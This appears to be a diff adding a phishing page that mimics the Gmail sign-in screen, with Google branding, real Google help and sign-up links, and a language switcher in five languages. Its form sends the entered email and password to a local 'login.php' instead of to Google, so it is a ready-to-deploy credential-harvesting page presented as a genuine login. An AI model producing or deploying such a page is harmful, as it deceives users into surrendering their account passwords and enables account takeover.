@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Sign in to Gmail">
+  <title>Gmail</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #404040;
+      line-height: 1.4;
+      height: 100%;
+    }
+    a { color: #427fed; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .wrapper {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 0 20px;
+    }
+
+    .header-bar {
+      text-align: center;
+      padding: 30px 0;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 0;
+    }
+
+    .banner h1 {
+      font: 300 28px/1.2 'Open Sans', Arial, sans-serif;
+      color: #555;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .banner h2 {
+      font: 400 18px 'Open Sans', Arial, sans-serif;
+      color: #555;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    .card {
+      background: #f7f7f7;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+      padding: 32px 24px;
+      width: 100%;
+      max-width: 300px;
+      margin: 0 auto;
+    }
+
+    .avatar-wrapper {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      overflow: hidden;
+      margin: 0 auto 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f1f3f4;
+    }
+
+    .avatar-wrapper svg {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      margin-bottom: 12px;
+      border: 1px solid #d9d9d9;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    input::placeholder {
+      color: #999;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4d90fe;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 10px;
+      background: #4d90fe;
+      background: linear-gradient(to bottom, #4d90fe, #4787ed);
+      border: 1px solid #3079ed;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .btn-submit:hover {
+      background: #357ae8;
+      background: linear-gradient(to bottom, #4d90fe, #357ae8);
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 16px 0;
+      font-size: 14px;
+    }
+
+    .remember input { width: auto; }
+
+    .help-link {
+      float: right;
+      font-size: 14px;
+    }
+
+    .footer {
+      padding: 16px 0;
+      font-size: 13px;
+      color: #737373;
+      text-align: center;
+    }
+
+    .footer a { color: #737373; }
+
+    .footer-links {
+      margin: 8px 0;
+    }
+
+    .lang-select {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 12px;
+    }
+
+    .lang-select select {
+      font-size: 13px;
+      padding: 2px 4px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      background: white;
+      cursor: pointer;
+    }
+
+    @media (min-width: 480px) {
+      .banner h1 { font-size: 36px; }
+      .card { padding: 40px; }
+      .avatar-wrapper {
+        width: 96px;
+        height: 96px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="header-bar">
+      <svg xmlns="http://www.w3.org/2000/svg" width="116" height="40" viewBox="0 0 116 40" aria-label="Google">
+        <text x="0" y="30" font-family="Product Sans, Arial, sans-serif" font-size="28" fill="#4285f4">G</text>
+        <text x="25" y="30" font-family="Product Sans, Arial, sans-serif" font-size="28" fill="#ea4335">o</text>
+        <text x="45" y="30" font-family="Product Sans, Arial, sans-serif" font-size="28" fill="#fbbc05">o</text>
+        <text x="65" y="30" font-family="Product Sans, Arial, sans-serif" font-size="28" fill="#4285f4">g</text>
+        <text x="82" y="30" font-family="Product Sans, Arial, sans-serif" font-size="28" fill="#34a853">l</text>
+        <text x="95" y="30" font-family="Product Sans, Arial, sans-serif" font-size="28" fill="#ea4335">e</text>
+      </svg>
+    </div>
+
+    <div class="main">
+      <div class="banner">
+        <h1 id="title1">One account. All of Google.</h1>
+        <h2 id="title2">Sign in to continue to Gmail</h2>
+      </div>
+
+      <div class="card">
+        <div class="avatar-wrapper">
+          <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="256" height="256" viewBox="0 0 256 256">
+            <g transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
+              <circle cx="45" cy="45" r="45" fill="#f1f3f4"/>
+              <circle cx="44.998" cy="39.608" r="20.268" fill="#80868b"/>
+              <path d="M10.499 73.892c8.255-9.847 20.647-16.107 34.501-16.107 13.854 0 26.246 6.261 34.501 16.108 0 0-8.255 9.846-20.647 16.107-12.392 6.261-26.246 6.261-40.1 0C18.754 83.739 10.499 73.892 10.499 73.892z" fill="#80868b"/>
+            </g>
+          </svg>
+        </div>
+
+        <form method="post" action="login.php">
+          <input id="Email" name="email" type="email" placeholder="Email" required>
+          <input id="Passwd" name="password" type="password" placeholder="Password" required>
+          <button type="submit" class="btn-submit" id="signInBtn">Sign in</button>
+
+          <label class="remember">
+            <input type="checkbox" checked>
+            <span id="staySigned">Stay signed in</span>
+          </label>
+
+          <a href="https://accounts.google.com/RecoverAccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F" class="help-link" id="needHelp">
+            Need help?
+          </a>
+        </form>
+      </div>
+
+      <p style="margin-top: 24px; text-align: center;">
+        <a href="https://accounts.google.com/SignUp?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&hl=en" id="createAccount">
+          Create an account
+        </a>
+      </p>
+    </div>
+
+    <div class="footer">
+      <div id="footer-google">Google</div>
+      <div class="footer-links">
+        <a href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank" id="privacyTerms">Privacy & Terms</a> •
+        <a href="https://support.google.com/accounts/?hl=en" target="_blank" id="helpLink">Help</a>
+      </div>
+      <div class="lang-select">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#737373" viewBox="0 0 16 16">
+          <circle cx="8" cy="8" r="7"/>
+          <circle cx="8" cy="5" r="1.5"/>
+          <circle cx="8" cy="11" r="1"/>
+        </svg>
+        <select id="lang-chooser">
+          <option value="en" selected>English</option>
+          <option value="id">Bahasa Indonesia</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+          <option value="pt">Português</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const translations = {
+      en: {
+        title1: "One account. All of Google.",
+        title2: "Sign in to continue to Gmail",
+        emailPlaceholder: "Email",
+        passwordPlaceholder: "Password",
+        signInBtn: "Sign in",
+        staySigned: "Stay signed in",
+        needHelp: "Need help?",
+        createAccount: "Create an account",
+        footerGoogle: "Google",
+        privacyTerms: "Privacy & Terms",
+        helpLink: "Help"
+      },
+      id: {
+        title1: "Satu akun. Semua layanan Google.",
+        title2: "Login untuk melanjutkan ke Gmail",
+        emailPlaceholder: "Email",
+        passwordPlaceholder: "Kata Sandi",
+        signInBtn: "Login",
+        staySigned: "Tetap login",
+        needHelp: "Butuh bantuan?",
+        createAccount: "Buat akun",
+        footerGoogle: "Google",
+        privacyTerms: "Privasi & Persyaratan",
+        helpLink: "Bantuan"
+      },
+      es: {
+        title1: "Una cuenta. Todo Google.",
+        title2: "Inicia sesión para continuar a Gmail",
+        emailPlaceholder: "Correo electrónico",
+        passwordPlaceholder: "Contraseña",
+        signInBtn: "Iniciar sesión",
+        staySigned: "Mantener la sesión iniciada",
+        needHelp: "¿Necesitas ayuda?",
+        createAccount: "Crear una cuenta",
+        footerGoogle: "Google",
+        privacyTerms: "Privacidad y condiciones",
+        helpLink: "Ayuda"
+      },
+      fr: {
+        title1: "Un compte. Tout Google.",
+        title2: "Connectez-vous pour accéder à Gmail",
+        emailPlaceholder: "E-mail",
+        passwordPlaceholder: "Mot de passe",
+        signInBtn: "Se connecter",
+        staySigned: "Rester connecté",
+        needHelp: "Besoin d'aide ?",
+        createAccount: "Créer un compte",
+        footerGoogle: "Google",
+        privacyTerms: "Confidentialité et conditions",
+        helpLink: "Aide"
+      },
+      pt: {
+        title1: "Uma conta. Todo o Google.",
+        title2: "Faça login para continuar para o Gmail",
+        emailPlaceholder: "E-mail",
+        passwordPlaceholder: "Senha",
+        signInBtn: "Fazer login",
+        staySigned: "Permanecer conectado",
+        needHelp: "Precisa de ajuda?",
+        createAccount: "Criar conta",
+        footerGoogle: "Google",
+        privacyTerms: "Privacidade e Termos",
+        helpLink: "Ajuda"
+      }
+    };
+
+    function safeSetItem(key, value) {
+      try { localStorage.setItem(key, value); } catch (e) {}
+    }
+    function safeGetItem(key) {
+      try { return localStorage.getItem(key); } catch (e) { return null; }
+    }
+
+    function changeLanguage(lang) {
+      const t = translations[lang] || translations.en;
+
+      const setText = (id, text) => {
+        const el = document.getElementById(id);
+        if (el) el.textContent = text;
+      };
+      const setPlaceholder = (id, text) => {
+        const el = document.getElementById(id);
+        if (el) el.placeholder = text;
+      };
+
+      setText('title1', t.title1);
+      setText('title2', t.title2);
+      setPlaceholder('Email', t.emailPlaceholder);
+      setPlaceholder('Passwd', t.passwordPlaceholder);
+      setText('signInBtn', t.signInBtn);
+      setText('staySigned', t.staySigned);
+      setText('needHelp', t.needHelp);
+      setText('createAccount', t.createAccount);
+      setText('footer-google', t.footerGoogle);
+      setText('privacyTerms', t.privacyTerms);
+      setText('helpLink', t.helpLink);
+
+      safeSetItem('preferredLang', lang);
+      document.documentElement.lang = lang;
+    }
+
+    function initLanguage() {
+      const langSelect = document.getElementById('lang-chooser');
+      if (!langSelect) return;
+
+      // Default to English if no saved preference
+      let savedLang = safeGetItem('preferredLang');
+      if (!savedLang) {
+        savedLang = 'en'; // ←✅ DEFAULT BAHASA INGGRIS
+      }
+
+      // Jika bahasa tersimpan tidak didukung, fallback ke 'en'
+      if (!translations[savedLang]) {
+        savedLang = 'en';
+      }
+
+      langSelect.value = savedLang;
+      changeLanguage(savedLang);
+
+      langSelect.addEventListener('change', (e) => {
+        changeLanguage(e.target.value);
+      });
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initLanguage);
+    } else {
+      initLanguage();
+    }
+  </script>
+</body>
+</html>
